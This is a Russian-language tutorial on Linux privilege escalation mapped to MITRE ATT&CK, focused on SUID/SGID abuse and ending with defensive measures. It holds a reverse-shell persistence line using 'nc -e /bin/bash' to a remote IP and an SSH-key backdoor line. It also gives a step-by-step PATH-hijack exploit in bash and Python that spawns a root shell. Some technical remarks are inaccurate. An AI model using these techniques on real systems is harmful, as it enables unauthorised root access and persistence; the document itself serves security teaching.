# Обзор методов и инструментов атакующих для повышения привилегий в Linux-системах 


Повышение привилегий (Privilege Escalation) в Linux-системах — это процесс получения прав суперпользователя (root) или других привилегированных учетных записей. 
Злоумышленники используют уязвимости в конфигурации, ошибки в программном обеспечении или слабые политики безопасности. 

---

## I: Эксплуатация конфигурационных ошибок
1. [**SUID/SGID-бинарники**](#1-эксплуатация-suidsgid-бинарников)  
   - Описание: Исполняемые файлы с правами запуска от владельца (например, `find`, `vim`).  
   - MITRE ATT&CK: [T1548.001](https://attack.mitre.org/techniques/T1548/001/)  
   - Примеры: `/usr/bin/find`, `/usr/bin/nmap`.

2. **Злоупотребление правами `sudo`**  
   - Описание: Использование разрешенных команд в `/etc/sudoers` для выполнения произвольного кода.  
   - MITRE ATT&CK: [T1548.003](https://attack.mitre.org/techniques/T1548/003/)  
   - Примеры: `sudo vi`, `sudo git`.

3. **Уязвимые cron-задачи**  
   - Описание: Модификация заданий в `/etc/cron.d/` или скриптов, запускаемых от root.  
   - MITRE ATT&CK: [T1053.003](https://attack.mitre.org/techniques/T1053/003/)  
   - Пример: Добавление задачи `chmod +s /bin/bash`.

---

## II: Уязвимости программного обеспечения
4. **Эксплуатация ядра Linux (CVE)**  
   - Описание: Использование публичных эксплоитов для уязвимостей ядра.  
   - MITRE ATT&CK: [T1068](https://attack.mitre.org/techniques/T1068/)  
   - Примеры: Dirty COW (CVE-2016-5195), PwnKit (CVE-2021-4034).

5. **Уязвимости в системных утилитах**  
   - Описание: Ошибки в ПО с правами root (например, `pkexec`, `polkit`).  
   - Пример: CVE-2021-4034 (PwnKit).

6. **Побег из Docker-контейнера**  
   - Описание: Использование привилегированных контейнеров или уязвимостей в `runc`.  
   - MITRE ATT&CK: [T1611](https://attack.mitre.org/techniques/T1611/)  
   - Пример: CVE-2019-5736.

---

## III: Манипуляции с окружением
7. **LD_PRELOAD-инжектирование**  
   - Описание: Подмена системных библиотек через переменную окружения.  
   - MITRE ATT&CK: [T1574.006](https://attack.mitre.org/techniques/T1574/006/)  
   - Пример: Внедрение кода в SUID-программы.

8. **Злоупотребление переменной PATH**  
   - Описание: Подмена пути к бинарникам, вызываемым с привилегиями.  
   - Пример: Создание фейкового `ls` в `/tmp`.

9. **Атаки через .bash_profile / .bashrc**  
   - Описание: Добавление вредоносного кода в файлы инициализации оболочки.  
   - Пример: `echo "nc -e /bin/bash 192.168.1.10 4444" >> ~/.bashrc`.

---

## IV: Сетевые атаки
10. **Злоупотребление NFS (no_root_squash)**  
    - Описание: Создание SUID-бинарников на удаленном NFS-шаре.  
    - MITRE ATT&CK: [T1574](https://attack.mitre.org/techniques/T1574/)  
    - Пример: `mount -o rw,vers=2 <IP>:/share /mnt`.

11. **SSH-туннелирование и ключи**  
    - Описание: Добавление публичного ключа в `authorized_keys`.  
    - MITRE ATT&CK: [T1098.004](https://attack.mitre.org/techniques/T1098/004/)  
    - Пример: `echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys`.

---

## V: Продвинутые методы
12. **Linux Capabilities**  
    - Описание: Использование расширенных прав (например, `CAP_DAC_READ_SEARCH`).  
    - Пример: `getcap -r /` для поиска уязвимых бинарников.

13. **Атаки на D-Bus**  
    - Описание: Эксплуатация системного шина для выполнения кода.  
    - Пример: Использование `dbus-send` для вызова привилегированных методов.

14. **Перехват файловых дескрипторов**  
    - Описание: Чтение/запись в файлы, открытые другими процессами.  
    - Пример: Использование `lsof` для поиска открытых `/etc/shadow`.

15. **Инжектирование кода в процессы (ptrace)**  
    - Описание: Внедрение шелл-кода в работающие процессы.  
    - Пример: Использование `gdb` для модификации памяти.

---

## VI: Социальная инженерия
16. **Фишинг через скрипты**  
    - Описание: Запуск вредоносных скриптов под видом легитимных.  
    - Пример: `./update.sh`, модифицирующий `/etc/passwd`.

---



---

# 1. Эксплуатация SUID/SGID-бинарников

**SUID** (Set User ID) и **SGID** (Set Group ID) — это специальные биты доступа, устанавливаемые на исполняемые файлы в Unix/Linux-системах. 
Эти биты позволяют запускать программу от имени владельца файла (SUID) или от имени группы файла (SGID), даже если пользователь, запускающий файл, 
не имеет таких прав. В UNIX‑подобных ОС каждое исполняемое приложение запускается с правами того пользователя, который его вызвал. Биты SUID и SGID позволяют временно «подменить» эти права:

- **SUID-бит** - при установленном SUID‑бите процесс получает эффективный UID (eUID) файла‑владельца, а не пользователя, который его запустил.
  - Флаг `-rwsr-xr-x` в правах файла
  - Пример: `-rwsr-xr-x 1 root root`
- **SGID-бит** - при установленном SGID‑бите процесс получает эффективный GID (eGID) на группу‑владельца файла, а не на группу-пользователя, который его запустил: 
  - Флаг `-rwxr-sr-x`
  - Пример: `-rwxr-sr-x 1 root staff`
- **UID/GID** — идентификаторы пользователя/группы в ОС.
- **eUID/eGID** — «эффективные» идентификаторы, определяют фактические привилегии процесса.

> **Примечание:**
> 1. Если SUID‑бинарник принадлежит `root`, то он будет выполняться с `euid=0` (привилегии суперпользователя), даже если запущен от имени обычного юзера.
> 2. Любая ошибка в SUID‑программе (например, небезопасный вызов `system()`, подстановка путей, некорректная обработка аргументов) сразу даёт возможность получить `root`‑доступ.  
> 3. В системе может быть множество SUID/SGID‑файлов, часть из которых давно не используется, но продолжает существовать.  

---

## MITRE ATT&CK

**[T1548.001]**  
**Abuse Elevation Control Mechanism: Setuid and Setgid**  
🔗 https://attack.mitre.org/techniques/T1548/001/

Атака использует программы с установленными флагами SUID/SGID, чтобы получить привилегии пользователя-владельца (часто root).
Если такие программы неправильно обрабатывают команды, пути или библиотеки, их можно использовать для запуска shell или кода с повышенными правами.

### Этапы атаки [T1548.001]

#### 1. [TA0001] – Initial Access (Начальный доступ)
> Получение доступа обычного пользователя.  

Атакующий получает доступ к системе под обычной учётной записью (через эксплойт, украденные учётные данные, фишинг и т.д.).

---

#### 2. [TA0007] – Discovery (Разведка)
> Поиск SUID/SGID-бинарников, изучение системы

- **[T1087.001]** – Local Accounts
  * Определение, от чьего имени работает сессия.
  * Анализ списка пользователей: `cat /etc/passwd`.

- **[T1033]** – System Owner/User Discovery
  * Проверка текущих прав: `id`, `whoami`.

- Поиск потенциальных точек повышения привилегий (`find`)

---

#### 3. [TA0004] – Privilege Escalation (Повышение привилегий)
> Эксплуатация SUID-бинарника для получения root

- **[T1548.001]** – Setuid and Setgid
  * Выявление и эксплуатация небезопасных SUID-бинарников.
  * Использование подмены переменной `PATH`, LD_PRELOAD, или встроенного shell в бинарниках (например, `nmap`, `python`, `vim`).

---

#### 4. [TA0002] – Execution (Выполнение)
> Запуск shell или полезной нагрузки от root

- **[T1059.004]** – Unix Shell
  * Запуск shell с root-привилегиями:

---

#### 5. [TA0003] – Persistence (Закрепление в системе)
> Добавление root-доступа (через crontab, ssh-ключи)

- Установка root SSH-ключа:
- Создание рутового cron-задания:

---

#### 6. [TA0010] – Exfiltration (Экфильтрация)
> Экспортирование данных, установка бэкдоров и использование системы как точки входа в инфраструктуру

---

### Примеры из практики:

#### [GTFOBins]
🔗 https://gtfobins.github.io
> Каталог легитимных бинарников, которые можно использовать для повышения привилегий (например, `find`, `nmap`, `vim`)  

---

#### [CVE-2023-22809] — Уязвимость в `sudoedit` (sudo)
🔗 https://www.qualys.com/2023/01/30/cve-2023-22809/cve-2023-22809.txt
> Уязвимость позволяет **обойти ограничения безопасности `sudoedit`** и редактировать произвольные файлы от имени root через подстановку символических ссылок, когда задействован `sudoedit`

Команда `sudoedit` запускается с root-привилегиями (через SUID), но должна ограничивать, какие файлы можно редактировать. Уязвимость позволяет атакующему создать **symbolic link** на защищённый файл, например, `/etc/passwd`, и изменить его **через подставной файл**, используя специально подобранный `argv[]` для обхода фильтрации

---

#### [CVE-2021-4034] — Уязвимость в `pkexec` (PwnKit)
🔗 https://access.redhat.com/security/cve/CVE-2021-4034
> Уязвимость позволяет вызвать `pkexec` (установлен с SUID) **без параметров**, что вызывает некорректную инициализацию аргументов и позволяет **инъекцию переменных окружения**, приводящую к **выполнению кода от root**

---

#### [CVE-2019-18634] — Stack overflow в `sudo`
🔗 https://www.sudo.ws/security/advisories/sudo_1.8.25p1.html
> Некорректная обработка команд, вызванных через SUDO с правами другого пользователя, в случае включённого `pwfeedback`, приводит к переполнению стека и потенциальному **выполнению произвольного кода**

Требуется SUID-бинарник sudo с включённой опцией `pwfeedback` в `/etc/sudoers`.

---


## Алгоритм повышения привилегий через SUID/SGID

### 1. Поиск SUID/SGID-файлов
```bash
find / -perm -4000 -type f 2>/dev/null  # Поиск всех файлов с SUID-битом
find / -perm -2000 -type f 2>/dev/null  # Поиск всех файлов с SGID-битом
```

> `-4000` — маска SUID, `-2000` — маска SGID  
> `2>/dev/null` — подавляет сообщения об ошибках (например, "Permission denied")


```python
import os, stat

def find_suid_sgid(root='/'):
    """
    Проход по файловой системе и вывод путей к файлам с SUID/SGID.
    """
    for dirpath, dirnames, filenames in os.walk(root):
        for fname in filenames:
            path = os.path.join(dirpath, fname)
            try:
                st = os.stat(path)
            except PermissionError:
                continue  # нет прав на чтение — пропускаем
            mode = st.st_mode
            # Проверяем SUID‑бит
            if mode & stat.S_ISUID:
                print(f"[SUID] {path}")
            # Проверяем SGID‑бит
            if mode & stat.S_ISGID:
                print(f"[SGID] {path}")

if __name__ == "__main__":
    find_suid_sgid("/")  # запускаем поиск от корня
   ```

---

### 2. Анализ найденных бинарников

#### Оценка:
- Это **нестандартный или пользовательский бинарник**?
- Использует ли он **shell-команды без указания полного пути**?
- Загружает ли **динамические библиотеки** без проверки?
- Принимает ли **ввод от пользователя** без валидации?

#### Действия:
1. **Изучить вызовы внешних программ** (`system()`, `exec*()`):  
   - Если вызывается `tar`, `cp`, `bash` без абсолютного пути → риск подстановки.  
2. **Проверить обработку аргументов**:  
   - Есть ли в программе парсинг пользовательского ввода?  
   - Возможна ли передача `../` (path traversal)?  
3. **Проверить переменные окружения**:  
   - `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `IFS` и т.п.  

---

### 3. Выбор метода эксплуатации

В зависимости от логики бинарника можно использовать:

- **Подмена переменной окружения `PATH`**  
  Если вызывается внешняя команда (например, `tar`, `cp`, `ls`), но **не указан абсолютный путь**


- **LD_PRELOAD атака**  
  Если SUID-бинарник **не защищён** (не имеет `noexec` и защищённой загрузки), можно внедрить произвольную `.so`-библиотеку

  > Работает **только если бинарник НЕ является SUID root**, либо загружает библиотеки вручную


- **Уязвимости в Python, Perl, Ruby и других интерпретируемых скриптах**  
  Если файл с SUID запускает скрипт без защиты (`#!/usr/bin/python`), можно использовать импорты или exec

  > SUID напрямую на скрипты не работает, но может быть уязвимый бинарник, запускающий их

---

### 4. Получение доступа с повышенными правами

- Чтение защищённых файлов;
- Создание новых пользователей;
- Получение интерактивной **shell** от **root**.

---


## Пример повышения привилегий через уязвимый SUID-бинарник

Использование функционала бинарника для выполнения произвольного кода.  

Предположим, найден уязвимый SUID‑скрипт `/usr/local/bin/mybackup`, который на самом деле является Python‑обёрткой:

```python
#!/usr/bin/env python3
import os, subprocess

# Этот скрипт запускается с правами root из‑за SUID‑бита, но очищает аргументы и не задаёт полные пути (возможна подстановка)
subprocess.call("tar -cf /tmp/backup.tar /home/user", shell=True)
```

> - Ключевая уязвимость здесь — отсутствие указания абсолютного пути к бинарнику tar. Это значит, что оболочка (`/bin/sh`) будет искать tar в переменной окружения PATH, начиная с первого найденного.
> - Злоумышленник создаёт свою "фальшивую" версию команды tar, которая подменяет настоящую.

---

### Блок-схема процесса эксплуатации
```
[Запуск SUID-скрипта mybackup от root] 
  → [Внутри вызывается 'tar -cf ...' без абсолютного пути] 
  → [Система ищет 'tar' по PATH: первым идёт /tmp] 
  → [Находит и запускает подставленный /tmp/tar.sh] 
  → [Внутри tar.sh исполняется /bin/bash] 
  → [bash запускается с root-привилегиями (наследование от SUID)] 
  → [Открывается root-оболочка с правами суперпользователя]
```

---

### Шаг 1: Создаём поддельный `tar`

```bash
cat << 'EOF' > /tmp/tar.sh
#!/bin/bash
/bin/bash
EOF
```

- `cat << 'EOF' > /tmp/tar.sh` — создаёт новый файл `/tmp/tar.sh` и записывает в него содержимое между `EOF`
- `#!/bin/bash` — шебанг: говорит ОС, что скрипт должен исполняться с помощью `bash`
- `/bin/bash` — запускает интерактивную оболочку `bash`  
  → Поскольку этот скрипт будет запущен от **root** (из-за SUID), запущенный bash — это **root‑оболочка**


### Шаг 2: Делаем скрипт исполняемым

```bash
chmod +x /tmp/tar.sh
```

- `+x` — добавляет права на исполнение скрипта для всех пользователей (поскольку по умолчанию при создании файла он создается без прав на выполнение)

### Шаг 3: Подменяем переменную окружения PATH

```bash
export PATH="/tmp:$PATH"
```

- Задаёт переменную `PATH` так, чтобы `/tmp` был **в начале списка директорий**
- Далее, когда оболочка будет искать `tar`, она сначала посмотрит в `/tmp`, и **найдёт `tar.sh`**, а не `/bin/tar`

### Шаг 4: Запускаем уязвимый бинарник

```bash
/usr/local/bin/mybackup
```

- Скрипт запускается и вызывает `tar` (без пути), значит оболочка выполняет `/tmp/tar.sh`.
- Внутри `tar.sh` вызывается `/bin/bash`, который запускается с **эффективным UID = 0**

### Шаг 5: Получаем root‑шелл:

В результате эксплойта получаем **интерактивную root-оболочку** `bash`, работающий с **эффективным UID = 0**, т.е. **root**

```bash
whoami         # → root
id             # → uid=0(root) gid=0(root)
```

---

### Python‑скрипт

```python
import os, subprocess

# Создаём «зловредный» tar в /tmp
with open("/tmp/tar.sh", "w") as f:
    f.write("#!/bin/bash\n/bin/bash\n")
os.chmod("/tmp/tar.sh", 0o755)     # даём права +x

# Подменяем PATH
os.environ["PATH"] = "/tmp:" + os.environ.get("PATH", "")

# Запускаем уязвимый скрипт
subprocess.call(["/usr/local/bin/mybackup"])
# В результате у нас попадает интерактивный bash с root‑привилегиями
```

---

### Примечание

- Уязвимый скрипт запускается с **root-привилегиями** из-за SUID
- Используется **относительный путь** к `tar` (небезопасно!)
- Пользователь может управлять `PATH`, а значит — **подставить вредоносную программу вместо системной**

---


## Защита от атак через SUID/SGID

### Активные меры

- Минимизировать число неиспользуемых SUID/SGID‑файлов, удаление ненужных или замена их на аналоги без SUID/SGID
- Использовать утилиту `nosuid` при монтировании томов
- Контролировать переменные окружения (обнулять **LD_PRELOAD**, **PATH**, **IFS** перед запуском внешних программ в SUID-бинарниках)
- Задавать полный путь к исполняемым файлам в SUID-программах
- Использование Mandatory Access Control (MAC) **AppArmor / SELinux** для контроля поведения приложений и ограничения прав бинарников
- Никогда не устанавливать SUID/SGID на пользовательские скрипты
- Проверять пути в вызовах команд (`use /bin/tar` вместо `tar`)
- Использовать `secure_path` в `/etc/sudoers` и ограничение на переменные окружения


### Пассивные меры

1. **Мониторинг логов и аудит файлов**  
   - `auditd` для слежения за вызовами `setuid/setgid`
   - регулярный запуск `AIDE`/`Tripwire` для контрольных сумм
   - регулярный аудит SUID/SGID-файлов (`auditctl`)
2. **CI/CD‑сканирование**  
   - проверять новые бинарники на наличие SUID/SGID перед деплоем
3. **Обучение администраторов**  
   – внутренние политики: когда действительно требуется SUID, а когда можно обойтись capability.  
4. **Регулярный аудит системы:**
   - Настройка cron-служб для проверки списка SUID/SGID-бинарников
5. **Обновление ПО**:
   - Установка исправлений для уязвимых бинарников:

---


## Реальные кейсы
- **nmap (режим interactive)**: Исторически имел SUID-бит, позволяющий запускать `!sh` для получения root.
- **CVE-2022-0847 (Dirty Pipe)**: Уязвимость в ядре, позволяющая модифицировать SUID-файлы.

---


## Заключение

SUID/SGID-бинарники — мощный инструмент в Linux, но также потенциальная угроза. Их неправильная настройка может позволить злоумышленнику получить root-доступ. Поэтому администраторы должны вести жесткий контроль, использовать контейнеризацию, мониторинг, и минимизацию поверхностей атаки.